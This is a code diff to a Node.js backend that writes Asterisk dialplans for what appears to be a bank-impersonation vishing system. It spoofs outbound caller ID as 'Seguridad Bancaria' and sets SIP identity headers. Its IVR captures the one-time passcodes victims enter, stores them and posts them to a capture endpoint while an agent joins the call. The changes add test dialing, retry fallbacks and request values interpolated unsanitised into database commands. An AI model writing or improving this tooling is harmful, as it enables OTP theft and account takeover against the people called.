@@ -124,11 +124,15 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
       return res.status(400).json({ success: false, error: 'extensions must be an array' });
     }
 
-    const activeCarrier = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].name)
-      ? carriers[0].name.replace(/\s+/g, '_')
+    const firstCarrier = (Array.isArray(carriers) && carriers.length > 0) ? carriers[0] : null;
+    const activeCarrier = (firstCarrier && firstCarrier.name)
+      ? firstCarrier.name.replace(/\s+/g, '_')
       : 'televox';
-    const outboundCid = (Array.isArray(carriers) && carriers.length > 0 && carriers[0].outboundCallerId)
-      ? carriers[0].outboundCallerId
+    const carrierHost = (firstCarrier && firstCarrier.host)
+      ? firstCarrier.host
+      : '52.144.46.192';
+    const outboundCid = (firstCarrier && firstCarrier.outboundCallerId)
+      ? firstCarrier.outboundCallerId
       : '+18005550199';
 
     // Generate clean pjsip.conf
@@ -249,8 +253,13 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
           const cCidName = carrier.outboundCallerIdName || 'Seguridad Bancaria';
           pjsipContent += `callerid = "${cCidName}" <${carrier.outboundCallerId}>\n`;
         }
-        pjsipContent += `from_user = ${carrier.outboundCallerId || carrier.fromuser || cUser || '18005550199'}\n`;
+        // from_user DEBE coincidir con el usuario de autenticación del carrier para evitar rechazo 403 Forbidden
+        const endpointFromUser = carrier.fromuser || cUser;
+        if (endpointFromUser) {
+          pjsipContent += `from_user = ${endpointFromUser}\n`;
+        }
         pjsipContent += `from_domain = ${cHost}\n`;
+        pjsipContent += `contact_user = ${cUser}\n`;
         pjsipContent += `direct_media = no\n`;
         pjsipContent += `rtp_symmetric = yes\n`;
         pjsipContent += `force_rport = yes\n`;
@@ -283,8 +292,40 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
-    dialplanContent += `; 2. Acceso directo IVR OTP y Press 1 para pruebas\n`;
-    dialplanContent += `exten => 8888,1,NoOp(Prueba Directa IVR desde Extension \${CALLERID(num)})\n`;
+    dialplanContent += `; 2. Acceso y Prueba Directa Extension 8888 -> Enlaza con Cliente de Pruebas 16104803845\n`;
+    dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA EXT 8888: Marcando al cliente de pruebas 16104803845 ===)\n`;
+    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(TEST_CLIENT=16104803845)\n`;
+    dialplanContent += ` same => n,Set(DB(ivr_vars/\${TEST_CLIENT}_agent_exten)=\${CALLING_AGENT})\n`;
+    dialplanContent += ` same => n,Set(DB(ivr_vars/\${TEST_CLIENT}_cid_name)=Seguridad Bancaria)\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
+    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
+    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
+    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
+    dialplanContent += ` same => n,NoOp(Conectando agente \${CALLING_AGENT} con cliente de pruebas \${TEST_CLIENT} via ${activeCarrier})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${TEST_CLIENT}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?ext8888_done)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?ext8888_busy)\n`;
+    dialplanContent += ` same => n,NoOp(Fallback 8888 con prefijo +: +\${TEST_CLIENT})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/+\${TEST_CLIENT}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?ext8888_done)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?ext8888_busy)\n`;
+    dialplanContent += ` same => n,NoOp(Fallback 8888 10 digitos: \${TEST_CLIENT:1})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${TEST_CLIENT:1}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n(ext8888_done),Hangup()\n`;
+    dialplanContent += ` same => n(ext8888_busy),Playtones(busy)\n`;
+    dialplanContent += ` same => n,Wait(3)\n`;
+    dialplanContent += ` same => n,Hangup()\n\n`;
+
+    dialplanContent += `; 2b. Acceso a Simulador IVR Local sin costo (*8888 o 8880)\n`;
+    dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
+    dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
     dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;
 
     dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
@@ -297,9 +338,21 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
     dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\\"\${CALLERID(name)}\\" <sip:\${CALLERID(num)}@${activeCarrier}>;party=calling;screen=yes;privacy=off")\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
+    dialplanContent += ` same => n,NoOp(Marcando \${EXTEN} por troncal ${activeCarrier} - Intento 1: 11 digitos)\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)\n`;
+    dialplanContent += ` same => n,NoOp(Fallback Intento 2 con +: +\${EXTEN})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/+\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)\n`;
+    dialplanContent += ` same => n,NoOp(Fallback Intento 3 a 10 digitos: \${EXTEN:1})\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN:1}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n(dial11_done),Hangup()\n`;
+    dialplanContent += ` same => n(dial11_busy),Playtones(busy)\n`;
+    dialplanContent += ` same => n,Wait(3)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
     dialplanContent += `; 4. Regla Saliente 10 digitos (antepone 1)\n`;
@@ -312,10 +365,12 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
     dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\\"\${CALLERID(name)}\\" <sip:\${CALLERID(num)}@${activeCarrier}>;party=calling;screen=yes;privacy=off")\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
     dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Tt)\n`;
-    dialplanContent += ` same => n,Hangup()\n\n`;
+    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial10_done)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
+    dialplanContent += ` same => n(dial10_done),Hangup()\n\n`;
 
     dialplanContent += `; 5. Regla Saliente Generica para cualquier otro numero saliente\n`;
     dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
@@ -327,8 +382,8 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
     dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
     dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${activeCarrier}>)\n`;
-    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\\"\${CALLERID(name)}\\" <sip:\${CALLERID(num)}@${activeCarrier}>;party=calling;screen=yes;privacy=off")\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@${carrierHost}>)\n`;
+    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)="\${CALLERID(name)}" <sip:\${CALLERID(num)}@${carrierHost}>;party=calling;screen=yes;privacy=off)\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
@@ -371,13 +426,20 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" > "1"]?otp_confirm:no_input)\n\n`;
     dialplanContent += `; Caso: Usuario ingreso codigo OTP\n`;
     dialplanContent += ` same => n(otp_confirm),NoOp(=== CODIGO OTP INGRESADO: \${USER_DIGITS} -> NOTIFICAR A ASESOR ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
     dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
-    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${CALLERID(num)},Digits=\${USER_DIGITS},Status=pending)\n`;
-    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${CALLERID(num)}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
+    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
+    dialplanContent += ` same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)\n`;
     dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+    dialplanContent += ` same => n,GotoIf($["\${CALLERID(num)}" = "\${FINAL_AGENT}"]?self_agent_test)\n`;
     dialplanContent += ` same => n,NoOp(=== MANTENIENDO ASESOR EN LLAMADA CON EL CLIENTE (EXT \${FINAL_AGENT}) ===)\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+    dialplanContent += ` same => n,Hangup()\n`;
+    dialplanContent += ` same => n(self_agent_test),NoOp(=== PRUEBA LOCAL COMPLETADA POR AGENTE \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
     dialplanContent += `; Caso: Presiono 1 -> Conectar con Asesor\n`;
     dialplanContent += ` same => n(press1_transfer),NoOp(=== PRESS 1 DETECTADO -> TRANSFERIR A ASESOR ===)\n`;
@@ -562,6 +624,12 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
     }
     recentOriginateRequests.set(cleanDest, now);
 
+    // Format destination for NANP standard
+    let formattedDest = cleanDest;
+    if (cleanDest.length === 10) {
+      formattedDest = `1${cleanDest}`;
+    }
+
     // Save campaign-selected audio and CallerID configuration to AstDB for this destination number
     const astDbCommands = [
       `database put ivr_vars ${cleanDest}_intro "${audioIntro || ''}"`,
@@ -571,6 +639,14 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       `database put ivr_vars ${cleanDest}_agent_exten "${agentExten || '1001'}"`,
       `database put ivr_vars ${cleanDest}_cid_num "${effectiveCidNum}"`,
       `database put ivr_vars ${cleanDest}_cid_name "${effectiveCidName}"`,
+      `database put ivr_vars ${formattedDest}_intro "${audioIntro || ''}"`,
+      `database put ivr_vars ${formattedDest}_prompt "${audioPrompt || ''}"`,
+      `database put ivr_vars ${formattedDest}_agent "${audioAgent || ''}"`,
+      `database put ivr_vars ${formattedDest}_success "${audioSuccess || ''}"`,
+      `database put ivr_vars ${formattedDest}_agent_exten "${agentExten || '1001'}"`,
+      `database put ivr_vars ${formattedDest}_cid_num "${effectiveCidNum}"`,
+      `database put ivr_vars ${formattedDest}_cid_name "${effectiveCidName}"`,
+      `database put test_client_number "${cleanDest}"`,
       `database put extension_cid ${agentExten || '1001'}/number "${effectiveCidNum}"`,
       `database put extension_cid ${agentExten || '1001'}/name "${effectiveCidName}"`,
     ];
@@ -581,12 +657,13 @@ app.post('/api/asterisk/call/originate', async (req, res) => {
       });
     }
 
-    // Determine channel: if <= 4 digits, internal extension, else trunk
+    // Determine channel: if <= 4 digits, direct internal extension
+    // Otherwise use Local channel to pass through [from-internal] with proper SIP headers and fallback rules
     let channel = '';
     if (cleanDest.length <= 4) {
       channel = `PJSIP/${cleanDest}`;
     } else {
-      channel = `PJSIP/${cleanDest}@${carrier}`;
+      channel = `Local/${formattedDest}@from-internal`;
     }
 
     // Execute originate command via Asterisk CLI with custom CallerID
